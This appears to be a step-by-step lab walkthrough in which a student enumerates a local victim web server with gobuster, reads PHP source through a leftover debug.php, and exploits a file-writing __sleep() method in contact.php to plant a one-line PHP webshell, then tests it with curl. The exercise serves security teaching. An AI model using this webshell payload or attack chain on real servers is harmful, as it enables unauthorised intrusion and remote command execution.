1. On the attacker-10 vm, open a terminal. To access the attacker-10 vm, on your browser,
   enter the address http://attacker_ip or ``localhost:6080/`` to access the VNC session. You may run ``` docker inspect          <image tag name> ``` to find the container's IP address.

2. Enter the command ``apt update -y && apt upgrade -y && apt install
   gobuster -y`` to install a tool called gobuster.

3. Open a terminal in victim. Type the command ifconfig to check the IP of the server.

4. On the attacker-10 vm, open firefox browser, or install any browser you like. Enter
   http://victim_ip to the URL bar to access the VNC session

5. Try going through the website like a normal user, is there anywhere you can exploit,
   anything you can enter?

6. Then, on the attacker vm. use the command ``gobuster -w
   /wordlist/wordlist_php -u http://victim_ip`` to list the directory and hidden
   file on the webserver. Feel free to try other web enumeration tools, and use different
   wordlist as well.

7. After running the gobuster rto enumerate the hidden file on the webserver, you will find a
   new file called debug.php running on the website. To open debug.php, use the command
   http://victim_ip/debug.php

8. Now you have found the debug.php, it’s a mistake made by the developer. To access the
   source code of debug.php, you can enter the URL: ``view-source:http://<victim's IP address>/debug.php?read=debug.php`` to view the source code of the
   debug.php.

9. In the source code of debug.php, there are two Get parameters you can manipulate. One
   is called read and the other is execute. read can let you check the source code of the
   websites and execute will allow you to execute file contain PHP source code

10. When you run the gobuster tool, I am sure you have also found another php file called
   contact.php. contact.php is the file where the website will process the contact information
   entered by user, we can see the source code of this file by entering the URL:
   http://<victim's IP address>/debug.php?read=contact.php

11. Upon reviewing the source code of contact.php file, what have you found? There is a
   critical vulnerability in the file, a deserialization vulnerability.
   ```
   <?php
   # Omitted some code
   
   $new_customer = new customer;
   $new_customer->name = $name;
   $new_customer->email = $email;
   $new_customer->comment = $comment;
   $temp = serialize($new_customer);
   
   # Omitted some code
   
   class customer
   {
      public $name;
      public $email;
      public $comment;
      public function __sleep()
      {
         // Write the content to file once the object is serialized
         $filename = $this->name . '_' . $this->email;
         file_put_contents("./user_info/$filename", $this-
   >comment, FILE_USE_INCLUDE_PATH);
      }
   }
   ?>
   ```
12. A closer look at the preceding code reveals that the vulnerability exists in the magic
   function __sleep() defined in the class customer. The logic in the function __sleep()
   shows that once an instance of class customer is serialized, it will write a file to a
   directory in the web root directory.

13. Now we know there is a vulnerability in the code, how do we use this vulnerability?
   Recall earlier I asked you to find the parameter you can interact with on the website,
   there is a webpage where you can enter user defined text. To navigate to this page, enter
   the URL http://<victim_ip>/contact.html to access the page.

14. On this page, there are three parameters you can define: name, email, and comment. If
    you still remember the source code of the contact.php file, you can make an educated
    guess that the contact.php will handle the post request sent by contact.html form. If you
    want to verify that, you can also download burpsuites and verify. Or you can also
    examine the source code of the contact.html page to see where the POST request is sent
    to.

16. To exploit the vulnerability we see before, enter test in the name bar, enter user.php in the
    email bar, and ``<?php $exec = system( $_GET['cmd'] ) ?>`` in the comment section. After
    entering all the text, click submit to plant the webshell

18. On the attacker VM, use the command ``curl
    http://<victim's IP address>/user_info/test_user.php?cmd=whoami`` to test whether the planted
    webshell is working or not.

19. A secure server is running on the address <secure's IP address>, you are welcome to try attacking
    it, but it does not have the deserialization vulnerability and misconfiguration present on
    the victim VM.
